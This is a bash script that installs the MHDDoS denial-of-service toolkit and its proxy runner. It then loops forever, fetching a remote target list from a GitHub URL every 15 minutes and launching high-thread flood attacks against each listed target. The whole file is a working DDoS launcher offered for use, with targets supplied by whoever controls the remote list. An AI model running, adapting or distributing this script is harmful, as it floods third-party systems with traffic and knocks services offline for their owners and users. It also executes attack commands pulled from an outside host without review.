#!/bin/bash
# Install git, python3 etc.
sudo apt update -y
sudo apt install git python3 python3-pip -y
sudo pip install --upgrade pip

#Install latest version of mhddos_proxy and MHDDoS
cd ~
sudo rm -r mhddos_proxy
git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
cd mhddos_proxy
sudo wget -N https://raw.githubusercontent.com/Aruiem234/mhddosproxy/main/proxies_config.json
sudo git clone https://github.com/MHProDev/MHDDoS.git
sudo python3 -m pip install -r MHDDoS/requirements.txt
cd ~

threads="${1:-1000}"
threads="-t $threads"

rpc="${2:-50}"
rpc="--rpc $rpc"

restart_interval="${3:-900}"

proxy_interval=3600
proxy_interval="-p $proxy_interval"

$debug="--debug"

# Restart attacks and update targets list every 15 minutes (by default)
while true
do
   pkill -f start.py; pkill -f runner.py 
   # Get number of targets.
   list_size=$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]" | wc -l)
   echo -e "\nNumber of targets in list: " $list_size "\n"
   for (( i=1; i<=list_size; i++ ))
      do
            cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets  | cat | grep "^[^#]")")
            echo -e $i": " "$cmd_line $proxy_interval $threads $rpc\n"
            python3 ~/mhddos_proxy/runner.py $cmd_line $threads $proxy_interval $rpc $debug&
      done
sleep $restart_interval
done
